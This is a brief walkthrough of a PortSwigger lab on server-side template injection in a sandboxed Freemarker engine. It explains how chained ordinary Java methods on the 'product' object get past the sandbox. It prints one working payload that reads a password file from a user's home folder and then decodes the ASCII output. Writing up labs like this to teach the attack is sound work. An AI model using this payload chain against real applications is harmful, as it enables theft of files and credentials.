# [Server-side template injection in a sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)

- Steal a password file
- File is in Carlos's home folder
- File name: `my_password.txt`

## The Problem

- The app uses **Freemarker** (a template engine)
- It has a **sandbox**
- The sandbox should stop dangerous code
- But the sandbox has gaps

## The Weak Spot

- You can edit a **product description template**
- Inside it, you can use the `product` object
- This object has **normal Java methods** on it
- The sandbox does not block these normal methods

## The Attack, Step by Step

- Use `product.getClass()`
- This is a basic Java method
- It opens the door to more Java tools
- Each method leads to the next
- Step by step, you move closer to file access
- None of the steps look dangerous alone
- One method lets you swap in a new file path
- You aim it at `my_password.txt`

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

- Freemarker can't print raw data
- So it prints **numbers** instead
- Each number is one letter's ASCII code
- Turn the numbers back into letters
- This gives you the password

## Why It Worked

- The sandbox blocks **known risky actions**
- It does **not** block **chains of normal methods**
- Those normal methods, used together, reach the same result
- This is a common sandbox weakness
